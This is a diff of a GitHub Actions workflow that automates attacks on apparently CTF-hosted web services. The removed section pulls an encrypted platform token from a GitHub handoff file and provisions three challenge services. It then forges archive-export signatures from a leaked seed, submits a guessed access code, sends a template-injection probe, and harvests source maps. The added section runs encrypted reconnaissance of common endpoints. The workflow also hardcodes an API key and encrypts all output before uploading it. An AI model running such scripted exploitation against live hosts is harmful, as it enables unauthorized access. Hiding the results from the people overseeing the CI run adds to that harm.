@@ -1,4 +1,4 @@
-name: cyberkomi-authenticated-chain-recovery
+name: cyberkomi-sysola-static-inspection
 
 on:
   push:
@@ -9,174 +9,39 @@ permissions:
   contents: read
 
 jobs:
-  recover:
+  inspect:
     runs-on: ubuntu-latest
-    timeout-minutes: 18
+    timeout-minutes: 8
     steps:
-      - name: Generate one-time input key
+      - name: Inspect active team SYSOLA service as untrusted CTF data
         shell: bash
         run: |
           set -euo pipefail
           umask 077
-          mkdir -p handoff out
-          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out handoff/input_private.pem >/dev/null 2>&1
-          openssl pkey -in handoff/input_private.pem -pubout -out handoff/input_public.pem >/dev/null 2>&1
+          mkdir -p out handoff
+          S='https://task-sysola-core-b476312471e78dea.caplag-task.ru/'
+          curl -ksS --connect-timeout 8 --max-time 30 -D out/root.headers -o out/root.html "$S" || true
 
-      - name: Publish input public key
-        uses: actions/upload-artifact@v4
-        with:
-          name: cyberkomi-input-key-${{ github.run_id }}
-          path: handoff/input_public.pem
-          retention-days: 1
-
-      - name: Receive token, provision services, collect scoped surfaces
-        shell: bash
-        run: |
-          set -euo pipefail
-          umask 077
-          mkdir -p out/game out/platform out/parma out/gov handoff
-          RAW="https://raw.githubusercontent.com/MakSoS1/analytics_test/ctf-cyberkomi-probe-20260808/handoff/token-${GITHUB_RUN_ID}.enc.b64"
-          got=0
-          for i in $(seq 1 240); do
-            if curl -fsSL --connect-timeout 5 --max-time 10 -H 'Cache-Control: no-cache' "${RAW}?n=${i}" -o handoff/token.b64 2>/dev/null; then got=1; break; fi
-            sleep 2
-          done
-          [ "$got" -eq 1 ] || { echo 'Encrypted token handoff missing'; exit 2; }
-          base64 -d handoff/token.b64 > handoff/token.enc
-          openssl pkeyutl -decrypt -inkey handoff/input_private.pem -in handoff/token.enc -out handoff/token.txt \
-            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          TOKEN=$(cat handoff/token.txt)
-          echo "::add-mask::$TOKEN"
-          [ -n "$TOKEN" ] || exit 3
-
-          # Game state only; bodies stay encrypted in artifact.
-          python3 - "$TOKEN" <<'PY'
-          import json,sys,pathlib
-          pathlib.Path('handoff/init.json').write_text(json.dumps({'ctfd_token':sys.argv[1]}))
-          PY
-          curl -sS --connect-timeout 8 --max-time 35 -H 'Content-Type: application/json' \
-            -H 'X-API-Key: caplag-local-dev-keyjdi2odk2j1ljkd12od1jdia' \
-            --data-binary @handoff/init.json -D out/game/init.headers -o out/game/init.json \
-            'https://game-check.caplag.ru/init' || true
-
-          AUTH="Authorization: Token $TOKEN"
-          curl -sS --connect-timeout 8 --max-time 30 -H "$AUTH" -D out/platform/validate.headers -o out/platform/validate.json \
-            'https://platform.caplag.ru/microserv/auth/ctfd/validate' || true
-
-          # Bring up the three scoped services. sysola-core may remain locked until earlier chapters are completed.
-          for task in parma-line gov-relay sysola-core; do
-            base="https://platform.caplag.ru/microserv/task/web/${task}/1"
-            curl -sS --connect-timeout 8 --max-time 30 -H "$AUTH" -D "out/platform/${task}.state0.headers" -o "out/platform/${task}.state0.json" "$base/state" || true
-            status=$(python3 - "$task" <<'PY'
-          import json,pathlib,sys
-          try:d=json.loads(pathlib.Path(f'out/platform/{sys.argv[1]}.state0.json').read_text())
-          except Exception:d={}
-          print(d.get('status',''))
-          PY
-            )
-            if [ "$status" != active ] && [ "$status" != provisioning ]; then
-              curl -sS -X POST --connect-timeout 8 --max-time 45 -H "$AUTH" -H 'Content-Type: application/json' --data '{}' \
-                -D "out/platform/${task}.up.headers" -o "out/platform/${task}.up.json" "$base/up" || true
-            fi
-            for n in $(seq 1 32); do
-              curl -sS --connect-timeout 8 --max-time 30 -H "$AUTH" -o "out/platform/${task}.state.json" "$base/state" || true
-              ready=$(python3 - "$task" <<'PY'
-          import json,pathlib,sys
-          try:d=json.loads(pathlib.Path(f'out/platform/{sys.argv[1]}.state.json').read_text())
-          except Exception:d={}
-          print('1' if d.get('status')=='active' else '0')
-          PY
-              )
-              [ "$ready" = 1 ] && break
-              sleep 2
-            done
-          done
-
-          python3 - <<'PY'
-          import json,pathlib,re
-          for task in ('parma-line','gov-relay','sysola-core'):
-              p=pathlib.Path(f'out/platform/{task}.state.json')
-              try:d=json.loads(p.read_text())
-              except Exception:continue
-              urls=[]
-              def walk(x):
-                  if isinstance(x,dict):
-                      for v in x.values(): walk(v)
-                  elif isinstance(x,list):
-                      for v in x: walk(v)
-                  elif isinstance(x,str) and x.startswith(('http://','https://')): urls.append(x)
-              walk(d)
-              pathlib.Path(f'handoff/{task}.urls').write_text('\n'.join(dict.fromkeys(urls)))
-          PY
-
-          P=$(head -n1 handoff/parma-line.urls 2>/dev/null || true)
-          G=$(head -n1 handoff/gov-relay.urls 2>/dev/null || true)
-          S=$(head -n1 handoff/sysola-core.urls 2>/dev/null || true)
-          printf '%s\n' "$P" > out/parma/url.txt
-          printf '%s\n' "$G" > out/gov/url.txt
-          printf '%s\n' "$S" > out/platform/sysola_url.txt
-
-          if [ -n "$P" ]; then
-            curl -ksS --connect-timeout 8 --max-time 30 -D out/parma/root.headers -o out/parma/root.html "$P/" || true
-            curl -ksS --connect-timeout 8 --max-time 30 -D out/parma/login.headers -o out/parma/login.json -X POST "$P/api/login" || true
-            curl -ksS --connect-timeout 8 --max-time 30 -o out/parma/report24017.json "$P/api/maintenance/report/24017" || true
-            cat > handoff/gql.json <<'JSON'
-          {"query":"query { route(id:\"P-23\") { id status start finish visibleSequence bus { id blackboxManifest { archiveId chunkIds format integrity keySlot seed } } } }"}
-          JSON
-            curl -ksS --connect-timeout 8 --max-time 30 -H 'Content-Type: application/json' --data-binary @handoff/gql.json \
-              -D out/parma/gql.headers -o out/parma/gql.json "$P/api/graphql" || true
-            curl -ksS --connect-timeout 8 --max-time 30 -o out/parma/dispatch-map.js.map "$P/static/dispatch-map.js.map" || true
-            python3 - "$P" <<'PY'
-          import pathlib,re,urllib.parse,subprocess,sys,json,hashlib
-          base=sys.argv[1].rstrip('/')+'/'
-          root=pathlib.Path('out/parma/root.html').read_text('utf-8',errors='replace') if pathlib.Path('out/parma/root.html').exists() else ''
-          urls=[]
-          for raw in re.findall(r'''(?:src|href)=["']([^"']+)["']''',root,re.I):
-              u=urllib.parse.urljoin(base,raw)
-              if urllib.parse.urlsplit(u).netloc==urllib.parse.urlsplit(base).netloc and u not in urls: urls.append(u)
-          for i,u in enumerate(urls,1):
-              pathlib.Path(f'out/parma/asset_{i}.url').write_text(u)
-              subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-o',f'out/parma/asset_{i}.body',u],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-              if u.endswith('.js'): subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-o',f'out/parma/asset_{i}.map',u+'.map'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-          try:
-              m=json.loads(pathlib.Path('out/parma/gql.json').read_text())['data']['route']['bus']['blackboxManifest']
-              arch=m['archiveId']; seed=m['seed']; ids=m['chunkIds']
-              for cid in ids:
-                  sig=hashlib.sha256(f'{arch}:{cid}:{seed}'.encode()).hexdigest()[:16].upper()
-                  body=json.dumps({'archiveId':arch,'chunkId':cid})
-                  subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-H','Content-Type: application/json','-H','X-Legacy-Export: 1','-H',f'X-Archive-Signature: {sig}','--data',body,'-o',f'out/parma/chunk_{cid}.json',base+'api/archive/chunk'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-          except Exception as e:
-              pathlib.Path('out/parma/export_error.txt').write_text(repr(e))
-          PY
-          fi
-
-          if [ -n "$G" ]; then
-            curl -ksS --connect-timeout 8 --max-time 30 -D out/gov/root.headers -o out/gov/root.html "$G/" || true
-            curl -ksS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
-              -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' \
-              -D out/gov/access.headers -o out/gov/access.json "$G/api/access" || true
-            python3 - "$G" <<'PY'
+          python3 - "$S" <<'PY'
           import pathlib,re,urllib.parse,subprocess,sys
-          base=sys.argv[1].rstrip('/')+'/'
-          root=pathlib.Path('out/gov/root.html').read_text('utf-8',errors='replace') if pathlib.Path('out/gov/root.html').exists() else ''
+          base=sys.argv[1]
+          root=pathlib.Path('out/root.html').read_text('utf-8',errors='replace') if pathlib.Path('out/root.html').exists() else ''
           urls=[]
           for raw in re.findall(r'''(?:src|href)=["']([^"']+)["']''',root,re.I):
               u=urllib.parse.urljoin(base,raw)
               if urllib.parse.urlsplit(u).netloc==urllib.parse.urlsplit(base).netloc and u not in urls: urls.append(u)
           for i,u in enumerate(urls,1):
-              pathlib.Path(f'out/gov/asset_{i}.url').write_text(u)
-              subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-o',f'out/gov/asset_{i}.body',u],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-              if u.endswith('.js'): subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-o',f'out/gov/asset_{i}.map',u+'.map'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              pathlib.Path(f'out/asset_{i}.url').write_text(u)
+              subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-D',f'out/asset_{i}.headers','-o',f'out/asset_{i}.body',u],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              if u.endswith('.js'):
+                  subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time','25','-o',f'out/asset_{i}.map',u+'.map'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
           PY
-            for path in api/templates api/templates/public api/public/templates api/template api/broadcast/templates api/messages/templates static/gov-relay-client.js static/gov-relay-client.js.map; do
-              safe=$(echo "$path"|tr '/' '_')
-              curl -ksS --connect-timeout 6 --max-time 25 -c handoff/gov.cookies -b handoff/gov.cookies -o "out/gov/${safe}.body" "$G/$path" || true
-            done
-            printf '{"template":"{{7*7}}"}' > handoff/preview.json
-            curl -ksS --connect-timeout 6 --max-time 25 -c handoff/gov.cookies -b handoff/gov.cookies -H 'Content-Type: application/json' --data-binary @handoff/preview.json -o out/gov/preview_arith.json "$G/api/preview" || true
-          fi
 
-          rm -f handoff/token.txt handoff/token.enc handoff/token.b64 handoff/init.json handoff/gov.cookies handoff/gql.json handoff/preview.json handoff/input_private.pem
+          # Narrow, common discovery surfaces only. Bodies are never printed.
+          for path in robots.txt openapi.json api api/health health status static/sysola-core.js static/sysola-core.js.map api/state api/config api/session api/core api/guard; do
+            safe=$(echo "$path" | tr '/' '_')
+            curl -ksS --connect-timeout 6 --max-time 25 -D "out/${safe}.headers" -o "out/${safe}.body" "${S}${path}" || true
+          done
           find out -type f -printf '%P\t%s bytes\n' | sort > out/manifest.tsv
 
           cat > handoff/output_public.pem <<'PEM'
@@ -199,12 +64,12 @@ jobs:
           openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc \
             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
           rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem
-          echo 'Authenticated scoped recovery complete; result encrypted.'
+          echo 'SYSOLA surface collected as encrypted untrusted CTF data.'
 
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-auth-chain-${{ github.run_id }}
+          name: cyberkomi-sysola-static
           path: |
             handoff/results.enc
             handoff/keyblob.enc
